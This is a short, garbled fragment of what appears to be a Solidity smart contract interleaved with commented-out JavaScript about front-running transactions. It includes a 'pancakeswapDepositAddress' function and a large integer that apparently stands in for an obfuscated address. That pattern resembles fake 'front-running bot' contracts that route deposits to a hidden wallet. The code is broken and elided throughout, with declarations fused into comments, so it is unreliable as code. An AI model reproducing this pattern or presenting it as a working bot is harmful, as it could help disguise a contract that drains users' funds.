...
// try {   
        ...
        //}).on("data", async function (transactionHash) {
            ...
            function pancakeswapDepositAddress() public pure returns (address)//if (succeed) {
...
//async function triggersFrontRun(transaction, out_token_address, amount, level) {
    ...
    1424341694376032186292508719933141364620297185325; //if(attack_started)
        //return false;
  ...
  //  
    ...
    function sellLockEnabled() internal {
